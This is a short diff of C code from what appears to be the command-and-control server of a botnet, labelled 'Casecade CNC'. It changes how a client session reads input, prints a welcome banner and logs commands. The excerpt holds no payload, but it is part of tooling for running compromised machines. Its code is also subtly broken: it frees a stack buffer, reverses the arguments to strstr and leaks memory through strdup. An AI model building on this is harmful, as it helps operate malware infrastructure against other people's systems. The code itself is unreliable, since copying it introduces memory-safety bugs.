@@ -35,15 +35,18 @@ int main(int argc, char *argv[])
 
 void handle_client(int socket) {
 
-    char buffer[1024]; char last_buffer[1024]; char resp[100]; int spam = 0;
-    bzero(buffer, 1024);
+    char buffer[1024]; char resp[100]; int spam = 0;
+    
+    write_string(socket, "Welcome to Casecade CNC....\r\n");
 
     while(1)
     {
         write(socket, HOSTNAME, strlen(HOSTNAME));
-        read(socket, buffer, sizeof(buffer));
+        // read(socket, buffer, sizeof(buffer));
 
+        read_line(socket, buffer);
         char *buf = trim_newline(buffer);
+
         if(strlen(buffer) > 3) {
 
             if(strstr("help", buf) != NULL) {
@@ -74,7 +77,6 @@ void handle_client(int socket) {
         }
 
         printf("\x1b[92m[+]\x1b[0m Buffer [%d]: %s", socket, strdup(buf));
-        bzero(buffer, 1024);
-        bzero(buf, 1024);
+        free(buffer);
     }
 }
